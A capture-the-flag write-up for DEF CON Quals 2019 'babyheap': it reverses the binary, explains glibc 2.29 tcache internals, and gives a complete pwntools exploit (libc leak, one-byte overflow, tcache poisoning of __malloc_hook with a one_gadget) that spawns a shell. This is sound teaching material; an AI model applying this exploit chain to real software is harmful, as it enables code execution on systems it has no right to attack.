# dcquals 2019 babyheap

We see that we are given a libc file and a binary. Let's take a look at them:
```
$    file babyheap
babyheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, BuildID[sha1]=afa4d4d076786b1a690f1a49923d1e054027e8e7, for GNU/Linux 3.2.0, stripped
$    pwn checksec babyheap
[*] '/Hackery/pod/modules/tcache/dcquals19_babyheap/babyheap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
$    ./babyheap
-----Yet Another Babyheap!-----
[M]alloc
[F]ree
[S]how
[E]xit
------------------------
Command:
> M
Size:
> 25
Content:
> 15935728
-----Yet Another Babyheap!-----
[M]alloc
[F]ree
[S]how
[E]xit
------------------------
Command:
> F
(Starting from 0) Index:
>
0
-----Yet Another Babyheap!-----
[M]alloc
[F]ree
[S]how
[E]xit
------------------------
Command:
> S
(Starting from 0) Index:
> 0
Show Error
```

## Reversing

So we can see that we are given a 64 bit binary with all of the standard binary mitigations. When we run it, we see that we are prompted with a menu. With this menu we can malloc memory, free it, and show it. To identify the version of libc, you should be able to just run the libc file (depending on your environment, this may not work). You can also use strings to ID it:

```
$    strings libc.so | grep libc-
libc-2.29.so
```

So we can see that it is running `libc-2.29.so`. With this version of libc, we will have to deal with the tcache mechanism. When we take a look at the binary in Ghidra, we don't see a `main` function labeled for us. However, looking through the functions (or checking xreferences) to strings we find this function which looks like the function which handles the menu:

```
/* WARNING: Could not reconcile some variable overlaps */

void FUN_0010151b(void)

{
  ulong uVar1;
  long in_FS_OFFSET;
  undefined8 local_108;
  undefined8 local_100;
  undefined8 local_f8;
  undefined8 local_f0;
  undefined2 local_e8;
  undefined local_e6;
  undefined8 local_e5;
  undefined8 local_dd;
  undefined8 local_d5;
  undefined8 local_cd;
  undefined2 local_c5;
  undefined local_c3;
  undefined8 local_c2;
  undefined8 local_ba;
  undefined8 local_b2;
  undefined8 local_aa;
  undefined2 local_a2;
  undefined local_a0;
  undefined8 local_9f;
  undefined8 local_97;
  undefined8 local_8f;
  undefined8 local_87;
  undefined2 local_7f;
  undefined local_7d;
  undefined8 local_7c;
  undefined8 local_74;
  undefined8 local_6c;
  undefined8 local_64;
  undefined2 local_5c;
  undefined local_5a;
  undefined8 local_59;
  undefined8 local_51;
  undefined8 local_49;
  undefined8 local_41;
  undefined2 local_39;
  undefined local_37;
  undefined2 menuOption;
  undefined8 local_30;
 
  local_30 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  menuOption = 0;
  local_108 = 0x7465592d2d2d2d2d;
  local_100 = 0x726568746f6e4120;
  local_f8 = 0x6165687962614220;
  local_f0 = 0x2d2d2d2d2d2170;
  local_e8 = 0;
  local_e6 = 0;
  local_e5 = 0x636f6c6c615d4d5b;
  local_dd = 0x20;
  local_d5 = 0;
  local_cd = 0;
  local_c5 = 0;
  local_c3 = 0;
  local_c2 = 0x206565725d465b;
  local_ba = 0;
  local_b2 = 0;
  local_aa = 0;
  local_a2 = 0;
  local_a0 = 0;
  local_9f = 0x20776f685d535b;
  local_97 = 0;
  local_8f = 0;
  local_87 = 0;
  local_7f = 0;
  local_7d = 0;
  local_7c = 0x207469785d455b;
  local_74 = 0;
  local_6c = 0;
  local_64 = 0;
  local_5c = 0;
  local_5a = 0;
  local_59 = 0x2d2d2d2d2d2d2d2d;
  local_51 = 0x2d2d2d2d2d2d2d2d;
  local_49 = 0x2d2d2d2d2d2d2d2d;
  local_41 = 0;
  local_39 = 0;
  local_37 = 0;
  do {
    puts((char *)&local_108);
    puts((char *)&local_e5);
    puts((char *)&local_c2);
    puts((char *)&local_9f);
    puts((char *)&local_7c);
    puts((char *)&local_59);
    __printf_chk(1,"Command:\n> ");
    read(0,&menuOption,2);
    if ((char)menuOption == 'F') {
      uVar1 = freeMemory();
    }
    else {
      if ((char)menuOption < 'G') {
        if ((char)menuOption != 'E') {
          uVar1 = 0xfffffffe;
          break;
        }
        uVar1 = 0xffffffff;
      }
      else {
        if ((char)menuOption == 'M') {
          uVar1 = mallocSpace();
        }
        else {
          if ((char)menuOption != 'S') goto LAB_00101799;
          uVar1 = showSpace();
        }
      }
    }
  } while ((int)uVar1 == 0);
  do {
    errorPrint(uVar1 & 0xffffffff);
LAB_00101799:
    uVar1 = 0xfffffffe;
  } while( true );
}
```

Looking at this function, it looks like a pretty standard menu function for ctf challenges. When we take a look at the `mallocSpace` function, we see this:

```
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined8 mallocSpace(void)

{
  long lVar1;
  long *plVar2;
  ulong size;
  void *largePtr;
  void *smallPtr;
  undefined8 result;
  ulong i;
  uint uVar3;
  uint sizeCpy;
  long in_FS_OFFSET;
  bool check;
  char inputChar;
 
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  if (_pointers == 0) {
    uVar3 = 0;
  
  else {
    uVar3 = 1;
    plVar2 = &DAT_00104070;
    while (*plVar2 != 0) {
      uVar3 = uVar3 + 1;
      plVar2 = plVar2 + 2;
    }
    if (9 < uVar3) {
      result = 0xfffffffd;
      goto LAB_001013ae;
    }
  
  __printf_chk(1,"Size:\n> ");
  size = getLong();
  if ((int)size - 1U < 0x178) {
    sizeCpy = (uint)(size & 0xffffffff);
    if (sizeCpy < 0xf9) {
      smallPtr = malloc(0xf8);
      *(void **)(&pointers + (ulong)uVar3 * 0x10) = smallPtr;
    }
    else {
      largePtr = malloc(0x178);
      *(void **)(&pointers + (ulong)uVar3 * 0x10) = largePtr;
    }
    if (*(long *)(&pointers + (ulong)uVar3 * 0x10) == 0) {
      result = 0xfffffffd;
    }
    else {
      *(uint *)(&sizes + (ulong)uVar3 * 0x10) = sizeCpy;
      __printf_chk(1,"Content:\n> ");
      read(0,&inputChar,1);
      i = 0;
      do {
        if ((inputChar == '\n') || (inputChar == '\0')) {
          result = 0;
          goto LAB_001013ae;
        }
        *(char *)(*(long *)(&pointers + (ulong)uVar3 * 0x10) + i) = inputChar;
        read(0,&inputChar,1);
        check = (size & 0xffffffff) != i;
        i = i + 1;
      } while (check);
      result = 0;
    }
  
  else {
    result = 0xfffffffd;
  
LAB_001013ae:
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  
  return result;
}
```

So in this function, we see that it prompts us for a size. We can see that we can only allocate two size chunks, `0xf8` and `0x178`. After that it allows us to scan in content into the chunk equal to `size` number of bytes. Thing is, this gives us a single byte overflow. Since arrays are zero index, if we get to scan in data to index `0xf8` that gives us `0xf9` bytes worth of data to scan into a `0xf8` byte chunk (it should scan in `size - 1` bytes to prevent the bug). In addition to that it saves a pointer to the chunk in the bss in `pointers` (`0x104060`), and the size of the chunk in the bss in `sizes` (`0x104068`). We can also see that out limit on the amount of chunks we can allocate is `10`. These both point to the same 1-D array, it's just every 8 bytes it swaps between a pointer and a size (and vice versa). Next let's look at the `freeSpace` function:

```
undefined8 freeSpace(void)

{
  uint index;
  undefined8 return;
  long indexBytes;
 
  puts("(Starting from 0) Index:\n> ");
  index = getLong();
  if (index < 10) {
    indexBytes = (ulong)index * 0x10;
    if (*(void **)(&pointers + indexBytes) == (void *)0x0) {
      return = 0xfffffffc;
    }
    else {
      memset(*(void **)(&pointers + indexBytes),0,(ulong)*(uint *)(&sizes + indexBytes));
      free(*(void **)(&pointers + indexBytes));
      *(undefined4 *)(&sizes + indexBytes) = 0;
      *(void **)(&pointers + indexBytes) = (void *)0x0;
      return = 0;
    }
  
  else {
    return = 0xfffffffc;
  
  return return;
}
```  

Looking at this function, we see that it prompts us for an index. It checks to see if it is valid by checking to see if there is a pointer that corresponds to the index. After that it will clear out the memory using `memset`, and free the pointer. It clears out the pointer and the size that corresponds with the freed index, so there is no UAF (Use After Free) here. Next we take a look at the `showSpace` function:

```
undefined8 showSpace(void)

{
  uint index;
  undefined8 result;
 
  __printf_chk(1,"(Starting from 0) Index:\n> ");
  index = getLong();
  if (index < 10) {
    if (*(char **)(&pointers + (ulong)index * 0x10) == (char *)0x0) {
      result = 0xfffffffb;
    }
    else {
      puts(*(char **)(&pointers + (ulong)index * 0x10));
      result = 0;
    }
  
  else {
    result = 0xfffffffb;
  
  return result;
}
```

Here we can see that it prompts us for an index, and checks it by checking for a pointer that corresponds to the index. If it passes the check, it prints the contents of the memory with `puts`.

## Exploitation

So we have a one byte heap overflow, the ability to allocate `10` heap chunks, and the ability to free/print those chunks. Our exploit will have two parts, the first being a libc infoleak.

### Infoleak

While doing the infoleak, we will have to deal with the tcache. The tcache is a mechanism designed to reuse recently allocated memory chunks by the same thread, in order to improve performance. By default the tcache list will only hold seven entries, which we can see in the malloc.c source code from this version of libc:

```
/* This is another arbitrary limit, which tunables can change.  Each
   tcache bin will hold at most this number of chunks.  */
# define TCACHE_FILL_COUNT 7
```

From reversing the binary, we know that we can have `10` blocks allocated at a time. What we will do is allocate `10` blocks, then free `7`. This will free up the tcache. While the tcache is freed, chunks we free will end up in the unsorted bin due to their size. When we take a look at the first chunk to enter into the unsorted bin (after we get at least one more chunk inserted into the unsorted bin), we see something very interesting:

```
gef➤  x/4g 0x56041198c950
0x56041198c950: 0x0 0x206b1
0x56041198c960: 0x7f8d327faca0  0x7f8d327faca0
gef➤  x/g 0x7f8d327faca0
0x7f8d327faca0: 0x56041198c950
```  

We can see in the data section, there are two pointers to the libc (specifically to somewhere in the main arena). What we can do is allocate this chunk again with malloc, and only write `8` bytes worth of data to it. Then we will just show this chunk, and since `puts` stops when it reaches a null byte, it will leak the libc address. We will go into more depth of the unsorted bin later. However before we allocate that chunk, we will have to allocate off all of the tcache chunks (which get allocated in the reverse order they were put in, so FILO). So we just have to allocate 7 chunks to free up the tcache, then the next chunk we allocate will give us our infoleak. Here is what the chunk looks like when we prep it for the infoleak:

```
gef➤  x/4g 0x564aa26bb950
0x564aa26bb950: 0x0 0x101
0x564aa26bb960: 0x3832373533393531  0x7f479de2fca0
gef➤  x/g 0x7f479de2fca0
0x7f479de2fca0: 0x564aa26bba50
```

### tcache attack

So before we get into attacking the tcache, let's take a look at what the tcache is exactly. Here we take a look at seven freed chunks in the tcache:

```
gef➤  x/4g 0x55bf78b7d250
0x55bf78b7d250: 0x0 0x101
0x55bf78b7d260: 0x0 0x55bf78b7d010
gef➤  x/4g 0x55bf78b7d350
0x55bf78b7d350: 0x0 0x101
0x55bf78b7d360: 0x55bf78b7d260  0x55bf78b7d010
gef➤  x/4g 0x55bf78b7d450
0x55bf78b7d450: 0x0 0x101
0x55bf78b7d460: 0x55bf78b7d360  0x55bf78b7d010
gef➤  x/4g 0x55bf78b7d550
0x55bf78b7d550: 0x0 0x101
0x55bf78b7d560: 0x55bf78b7d460  0x55bf78b7d010
gef➤  x/4g 0x55bf78b7d650
0x55bf78b7d650: 0x0 0x101
0x55bf78b7d660: 0x55bf78b7d560  0x55bf78b7d010
gef➤  x/4g 0x55bf78b7d750
0x55bf78b7d750: 0x0 0x101
0x55bf78b7d760: 0x55bf78b7d660  0x55bf78b7d010
gef➤  x/4g 0x55bf78b7d850
0x55bf78b7d850: 0x0 0x101
0x55bf78b7d860: 0x55bf78b7d760  0x55bf78b7d010
```

Here we can see that the tcache is essentially a linked list. The linked list contains a pointer to the next chunk which will be allocated. The first chunk from the tcache that will be allocated is the chunk at `0x55bf78b7d850`. So how this attack works is we overwrite a pointer in the linked list with the address of malloc hook, and we will allocate chunks until malloc gives us a pointer to the malloc hook. With that we can just directly write a oneshot gadget (https://github.com/david942j/one_gadget) to the malloc hook, and the next time we call `malloc` we will get a shell.

Also a bit more on tcaching, tcahe was introduced in libc version `2.26` (so expect to have it in versions after it, unless if it is removed in a later version). Whenever a chunk is allocated or freed, it will first look in the tcache. If it finds a chunk in the tcache while allocating memory that meets the size requirement it will pull it from the tcache (typically in a LIFO manner). If the tcache is full when a chunk is being freed, then it will go to one of the other bins. Also with the tcache, there are two different data structures associated with it (that we can see from `malloc.c` from: https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=f8e7250f70f6f26b0acb5901bcc4f6e39a8a52b2;hb=23158b08a0908f381459f273a984c6fd328363cb#l2902)


```
2900 #if USE_TCACHE
2901
2902 /* We overlay this structure on the user-data portion of a chunk when
2903    the chunk is stored in the per-thread cache.  */
2904 typedef struct tcache_entry
2905 {
2906   struct tcache_entry *next;
2907 } tcache_entry;
2908
2909 /* There is one of these for each thread, which contains the
2910    per-thread cache (hence "tcache_perthread_struct").  Keeping
2911    overall size low is mildly important.  Note that COUNTS and ENTRIES
2912    are redundant (we could have just counted the linked list each
2913    time), this is for performance reasons.  */
2914 typedef struct tcache_perthread_struct
2915 {
2916   char counts[TCACHE_MAX_BINS];
2917   tcache_entry *entries[TCACHE_MAX_BINS];
2918 } tcache_perthread_struct;
```

So can see that the tcache has a `tcache_perthread_struct` per each thread, and each entry into the tcache is stored as a `tcache_entry` struct (which just contains a pointer to the next entry). In addition to that, we can see the code which will add / remove entries from the tcache.


```
2926 tcache_put (mchunkptr chunk, size_t tc_idx)
2927 {
2928   tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
2929   assert (tc_idx < TCACHE_MAX_BINS);
2930   e->next = tcache->entries[tc_idx];
2931   tcache->entries[tc_idx] = e;
2932   ++(tcache->counts[tc_idx]);
2933 }
2934
2935 /* Caller must ensure that we know tc_idx is valid and there's
2936    available chunks to remove.  */
2937 static __always_inline void *
2938 tcache_get (size_t tc_idx)
2939 {
2940   tcache_entry *e = tcache->entries[tc_idx];
2941   assert (tc_idx < TCACHE_MAX_BINS);
2942   assert (tcache->entries[tc_idx] > 0);
2943   tcache->entries[tc_idx] = e->next;
2944   --(tcache->counts[tc_idx]);
2945   return (void *) e;
2946 }
```

So we can see for `tcache_put` it checks to make sure that the index doesn't exceed `TCACHE_MAX_BINS`, and if not it will store the chunk in the linked list and increment the count. For `tcache_get` it checks that the index doesn't exceed `TCACHE_MAX_BINS`, and that the count is greater than `0`. It will then grab the first item from the top of the tcache and return it.

Now to get back to the exploitation, we need to be able to edit a freed chunk in order to edit the tcache linked list and allocate a chunk to the hook of malloc. Taking a look at the heap metadata, we see that the two sizes for the two chunks when allocated are `0x101` and `0x181`:

```
ef➤  x/200g 0x56541cbc3250
0x56541cbc3250: 0x0 0x101
0x56541cbc3260: 0x3030303030303030  0x0
0x56541cbc3270: 0x0 0x0
0x56541cbc3280: 0x0 0x0
0x56541cbc3290: 0x0 0x0
0x56541cbc32a0: 0x0 0x0
0x56541cbc32b0: 0x0 0x0
0x56541cbc32c0: 0x0 0x0
0x56541cbc32d0: 0x0 0x0
0x56541cbc32e0: 0x0 0x0
0x56541cbc32f0: 0x0 0x0
0x56541cbc3300: 0x0 0x0
0x56541cbc3310: 0x0 0x0
0x56541cbc3320: 0x0 0x0
0x56541cbc3330: 0x0 0x0
0x56541cbc3340: 0x0 0x0
0x56541cbc3350: 0x0 0x181
0x56541cbc3360: 0x3131313131313131  0x0
```

So here is our plan. We will use the one byte overflow to overflow the size value of a chunk header, which we will then free. We will overflow a size header of `0x101` (for an `0xf8` byte chunk) with the byte `0x81` to give us the value `0x181`. We will then free it, and then allocate an `0x178` byte chunk. This will give us the chunk for the `0xf8` byte chunk we allocated, but allow us to write `0x178` bytes to it which will give us a pretty large overflow (compared to what we were looking at before). With this we should be able to overwrite the next pointer in a linked list (since we would have freed plenty of chunks as part of the heap grooming process, if not from the infoleak already). Then it will just be a matter of allocating chunks off of the tcache, until it allocates the address of the malloc hook since we overwrite the next pointer in a tcache entry with it.

Let's take a look at how the memory is corrupted exactly as we do this. First we start out with our chunk which we will overflow (holds 33333333) followed by a chunk stored in the tcache mechanism with a linked list pointer:

```
gef➤  x/64g 0x55d01d7cc850
0x55d01d7cc850: 0x0 0x101
0x55d01d7cc860: 0x3333333333333333  0x0
0x55d01d7cc870: 0x0 0x0
0x55d01d7cc880: 0x0 0x0
0x55d01d7cc890: 0x0 0x0
0x55d01d7cc8a0: 0x0 0x0
0x55d01d7cc8b0: 0x0 0x0
0x55d01d7cc8c0: 0x0 0x0
0x55d01d7cc8d0: 0x0 0x0
0x55d01d7cc8e0: 0x0 0x0
0x55d01d7cc8f0: 0x0 0x0
0x55d01d7cc900: 0x0 0x0
0x55d01d7cc910: 0x0 0x0
0x55d01d7cc920: 0x0 0x0
0x55d01d7cc930: 0x0 0x0
0x55d01d7cc940: 0x0 0x0
0x55d01d7cc950: 0x0 0x101
0x55d01d7cc960: 0x55d01d7cca60  0x55d01d7cc010
```

Then we will allocate a chunk behind (thanks to a bit of heap grooming) the 33333333 chunk, which will overflow the size value with the byte 0x81.

```
gef➤  x/64g 0x55d01d7cc790
0x55d01d7cc790: 0x3434343434343434  0x3434343434343434
0x55d01d7cc7a0: 0x3434343434343434  0x3434343434343434
0x55d01d7cc7b0: 0x3434343434343434  0x3434343434343434
0x55d01d7cc7c0: 0x3434343434343434  0x3434343434343434
0x55d01d7cc7d0: 0x3434343434343434  0x3434343434343434
0x55d01d7cc7e0: 0x3434343434343434  0x3434343434343434
0x55d01d7cc7f0: 0x3434343434343434  0x3434343434343434
0x55d01d7cc800: 0x3434343434343434  0x3434343434343434
0x55d01d7cc810: 0x3434343434343434  0x3434343434343434
0x55d01d7cc820: 0x3434343434343434  0x3434343434343434
0x55d01d7cc830: 0x3434343434343434  0x3434343434343434
0x55d01d7cc840: 0x3434343434343434  0x3434343434343434
0x55d01d7cc850: 0x3434343434343434  0x181
0x55d01d7cc860: 0x3333333333333333  0x0
0x55d01d7cc870: 0x0 0x0
0x55d01d7cc880: 0x0 0x0
0x55d01d7cc890: 0x0 0x0
0x55d01d7cc8a0: 0x0 0x0
0x55d01d7cc8b0: 0x0 0x0
0x55d01d7cc8c0: 0x0 0x0
0x55d01d7cc8d0: 0x0 0x0
0x55d01d7cc8e0: 0x0 0x0
0x55d01d7cc8f0: 0x0 0x0
0x55d01d7cc900: 0x0 0x0
0x55d01d7cc910: 0x0 0x0
0x55d01d7cc920: 0x0 0x0
0x55d01d7cc930: 0x0 0x0
0x55d01d7cc940: 0x0 0x0
0x55d01d7cc950: 0x0 0x101
0x55d01d7cc960: 0x55d01d7cca60  0x55d01d7cc010
```

Then we will free the 33333333 chunk, then immediately allocate a new chunk of size 0x174 and use it to overwrite the next pointer in the linked list to the address of the malloc hook:

```
gef➤  x/64g 0x55d01d7cc790
0x55d01d7cc790: 0x3434343434343434  0x3434343434343434
0x55d01d7cc7a0: 0x3434343434343434  0x3434343434343434
0x55d01d7cc7b0: 0x3434343434343434  0x3434343434343434
0x55d01d7cc7c0: 0x3434343434343434  0x3434343434343434
0x55d01d7cc7d0: 0x3434343434343434  0x3434343434343434
0x55d01d7cc7e0: 0x3434343434343434  0x3434343434343434
0x55d01d7cc7f0: 0x3434343434343434  0x3434343434343434
0x55d01d7cc800: 0x3434343434343434  0x3434343434343434
0x55d01d7cc810: 0x3434343434343434  0x3434343434343434
0x55d01d7cc820: 0x3434343434343434  0x3434343434343434
0x55d01d7cc830: 0x3434343434343434  0x3434343434343434
0x55d01d7cc840: 0x3434343434343434  0x3434343434343434
0x55d01d7cc850: 0x3434343434343434  0x181
0x55d01d7cc860: 0x3131313131313131  0x3131313131313131
0x55d01d7cc870: 0x3131313131313131  0x3131313131313131
0x55d01d7cc880: 0x3131313131313131  0x3131313131313131
0x55d01d7cc890: 0x3131313131313131  0x3131313131313131
0x55d01d7cc8a0: 0x3131313131313131  0x3131313131313131
0x55d01d7cc8b0: 0x3131313131313131  0x3131313131313131
0x55d01d7cc8c0: 0x3131313131313131  0x3131313131313131
0x55d01d7cc8d0: 0x3131313131313131  0x3131313131313131
0x55d01d7cc8e0: 0x3131313131313131  0x3131313131313131
0x55d01d7cc8f0: 0x3131313131313131  0x3131313131313131
0x55d01d7cc900: 0x3131313131313131  0x3131313131313131
0x55d01d7cc910: 0x3131313131313131  0x3131313131313131
0x55d01d7cc920: 0x3131313131313131  0x3131313131313131
0x55d01d7cc930: 0x3131313131313131  0x3131313131313131
0x55d01d7cc940: 0x3131313131313131  0x3131313131313131
0x55d01d7cc950: 0x3131313131313131  0x3131313131313131
0x55d01d7cc960: 0x7fea6bc49c30  0x55d01d7cc010
0x55d01d7cc970: 0x0 0x0
0x55d01d7cc980: 0x0 0x0
gef➤  x/g 0x7fea6bc49c30
0x7fea6bc49c30 <__malloc_hook>: 0x0
```

Now that that is done, we can just allocate chunks until we get malloc to return a pointer to the malloc hook (which due to how we groomed the heap, is only two). Proceeding that we can just get the program to call malloc, and we get a shell. Also we need to get our oneshot gadget:

```
$ one_gadget libc.so
0xe237f execve("/bin/sh", rcx, [rbp-0x70])
constraints:
  [rcx] == NULL || rcx == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xe2383 execve("/bin/sh", rcx, rdx)
constraints:
  [rcx] == NULL || rcx == NULL
  [rdx] == NULL || rdx == NULL

0xe2386 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

0x106ef8 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

## Exploit

Putting it all together, we get the following exploit. This exploit was ran on Ubuntu `19.04`:

```
from pwn import *

#target = process('./babyheap', env={"LD_PRELOAD":"./libc.so"})
target = process('./babyheap')
gdb.attach(target, gdbscript='pie b *0x147b')
libc = ELF('libc.so')

# Helper functions to handle I/O with program
def ri():
  print target.recvuntil('>')

def malloc(content, size, new=0):
  ri()  
  target.sendline('M')
  ri()
  target.sendline(str(size))
  ri()
  if new == 0:
            target.sendline(content)
  else:
      target.send(content)

def free(index):
  ri()
  target.sendline('F')
  ri()
  target.sendline(str(index))
    
def show(index):
  ri()
  target.sendline('S')
  ri()
  target.sendline(str(index))

# Start off by allocating 10 blocks, then free them all.
# Fill up the tcache and get some blocks in the unsorted bin for the leak

for i in xrange(10):
    malloc(str(i)*0xf8, 0xf8)

for i in range(9, -1, -1):
    free(i)


# Allocate blocks until we get to the one stored in the unsorted bin with the libc address
malloc('', 0xf8)
malloc('', 0xf8)
malloc('', 0xf8)
malloc('', 0xf8)
malloc('', 0xf8)
malloc('', 0xf8)
malloc('', 0xf8)
malloc('', 0xf8)
malloc('15935728', 0xf8) # Libc address here

# Leak the libc address
ri()
target.sendline('S')
ri()
target.sendline('8')
target.recvuntil("15935728")

leak = target.recvline().replace("\x0a", "")
leak = u64(leak + "\x00"*(8 - len(leak)))
libcBase = leak - 0x1e4ca0

print "libc base: " + hex(libcBase)



# Free all allocated blocks, so we can allocate more
for i in range(8, -1, -1):
    free(i)

# Allocate / free blocks in certain order, to groom heap so we can
# allocate blocks behind already existing blocks

malloc("1"*8, 0x8)
malloc("2"*8, 0x8)

free(0)
free(1)


# This is the chunk whose size value will be overflowed
malloc('3'*8, 0x8)

# Allocate a chunk to overflow that chunk's size with '0x81'
malloc('4'*0xf8 + "\x81", 0xf8)

# Free the overflowed chunk
free(0)


# Allocate overflowed chunk again, however this time we can write more data to it
# because of the overflowed size value. Overwrite the next pointer in the tcache linked
# list in the next chunk with the address of malloc_hook
malloc('1'*0x100 + p64(libcBase + libc.sym["__malloc_hook"])[:6], 0x174)

# Allocate a block on the chunk, so the next one will be to the malloc hook

malloc("15935728", 0x10)

# Calculate the onegadget address, then send it over
onegadget = libcBase + 0xe2383
malloc(p64(onegadget)[:6], 0x10)

# Get the program to call malloc, and get a shell
target.sendline('M')
target.sendline("10")

target.interactive()
```

When we run it:

```
$ python exploit.py
[+] Starting local process './babyheap': pid 27132
[*] running in new terminal: /usr/bin/gdb -q  "./babyheap" 27132 -x "/tmp/pwn84K7wz.gdb"
[+] Waiting for debugger: Done
[*] '/home/guyinatuxedo/Desktop/efwafew/libc.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
-----Yet Another Babyheap!-----
[M]alloc
[F]ree
[S]how
[E]xit
------------------------
Command:
>

. . .

> $ w
 22:36:10 up  2:44,  1 user,  load average: 0.17, 0.04, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu :0       :0               19:52   ?xdm?   1:22   0.01s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --session=ubuntu
$ ls
babyheap  exploit.py  libc.so
```

Just like that, we popped a shell!
